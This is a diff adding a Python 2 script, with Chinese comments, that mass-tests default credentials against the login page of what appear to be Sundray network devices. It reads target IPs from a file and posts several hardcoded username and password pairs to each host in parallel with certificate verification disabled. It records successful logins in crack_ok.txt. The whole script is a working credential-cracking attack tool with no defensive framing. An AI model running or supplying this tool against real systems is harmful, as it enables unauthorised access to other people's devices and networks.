@@ -1,0 +1,42 @@
+# !/usr/bin/python
+# -*- coding:utf-8 -*-
+'''
+_author_=Captain
+'''
+import requests
+import os
+from multiprocessing import Pool
+import sys
+reload(sys)   # Python2.5 初始化后会删除 sys.setdefaultencoding 这个方法，我们需要重新载入
+sys.setdefaultencoding('utf-8')     #将默认的ASCII码改为UTF-8编码
+
+with open(os.getcwd()+"\ip.txt",'r') as file:
+    IP_adress=file.readlines()     #读取ip.txt文档中要扫描的IP
+payloads={
+    '1':{'username':'admin','password':'admin','times':'0'},
+    '2':{'username':'admin','password':'sundray','times':'0'},
+    '3':{'username':'admin','password':'sundray123','times':'0'},
+    '4':{'username':'sundray8','password':'sundray','times':'0'}
+}
+def cracking(url):
+    url="https://" + url.strip() + "/index.php/welcome/login"
+    for payload in payloads.values():
+        try:
+            webdata=requests.post(url,data=payload,verify=False,timeout=8)
+            webdata.encoding='utf-8'
+            if u'密码错误' in webdata.text:
+                print "密码错误",url,'  ',payload
+            elif u'冻结' in webdata.text:
+                print "账号被冻结",url,'  ',payload
+            else:
+                print "破解成功 ",url,'  ',payload
+                with open(os.getcwd() + "\crack_ok.txt", 'w') as file:
+                    file.writelines(url + ' ' + str(payload) + '\r\n')
+                    #如果破解成功则将网站url和用户名密码写入crack_ok.txt文件中；如果该文件不存在则自动创建
+        except:
+            print "网站访问超时 ",url
+            continue
+
+if __name__ == '__main__':
+    pool=Pool()
+    pool.map(cracking,IP_adress)
